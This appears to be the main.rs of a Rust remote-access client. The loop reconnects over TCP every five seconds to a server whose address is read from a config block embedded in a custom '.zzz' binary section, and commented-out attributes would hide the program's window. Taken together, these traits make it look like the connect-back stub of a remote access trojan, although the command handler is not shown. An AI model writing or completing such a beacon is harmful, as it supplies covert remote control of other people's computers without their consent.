//#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
//#![cfg_attr(debug_assertions, windows_subsystem = "windows")]

#[no_mangle]
#[link_section = ".zzz"]
static CONFIG: [u8; 1024] = [0; 1024];

use std::net::TcpStream;
use std::sync::{ Arc, Mutex };
use std::thread::sleep;
use once_cell::sync::Lazy;


use winapi::um::winuser::SetProcessDPIAware;

use crate::handler::handle_server;

pub mod features;
pub mod service;
pub mod handler;

static SECRET_INITIALIZED: Lazy<Mutex<bool>> = Lazy::new(|| Mutex::new(false));
static SECRET: Lazy<Mutex<[u8; common::SECRET_LEN]>> = Lazy::new(||
    Mutex::new([0u8; common::SECRET_LEN])
);

fn main() {
    let config = service::config::get_config();

    let is_connected = Arc::new(Mutex::new(false));
    let is_connecting = Arc::new(Mutex::new(false));


    unsafe {
        // Fix DPI issues with remote desktop control
        SetProcessDPIAware();
    }

    loop {
        let config_clone = config.clone();
        let is_connected_clone = is_connected.clone();
        let is_connecting_clone = is_connecting.clone();

        if *is_connecting.lock().unwrap() {
            sleep(std::time::Duration::from_secs(5));
            continue;
        }

        if *is_connected_clone.lock().unwrap() {
            sleep(std::time::Duration::from_secs(5));
            continue;
        } else {
        }

        std::thread::spawn(move || {
            println!("Connecting to server...");
            {
                *is_connecting_clone.lock().unwrap() = true;
            }
            let stream = TcpStream::connect(format!("{}:{}", config_clone.ip, config_clone.port));

            match stream {
                Ok(str) => {
                    {
                        *is_connected_clone.lock().unwrap() = true;
                        *is_connecting_clone.lock().unwrap() = false;
                    }
                    handle_server(
                        str.try_clone().unwrap(),
                        str.try_clone().unwrap(),
                        is_connected_clone,
                        is_connecting_clone
                    );
                }
                Err(e) => {
                    println!("Failed to connect to server: {}", e);
                    {
                        *is_connecting_clone.lock().unwrap() = false;
                        *is_connected_clone.lock().unwrap() = false;
                    }
                    return;
                }
            }
        });
        sleep(std::time::Duration::from_secs(5));
    }
}
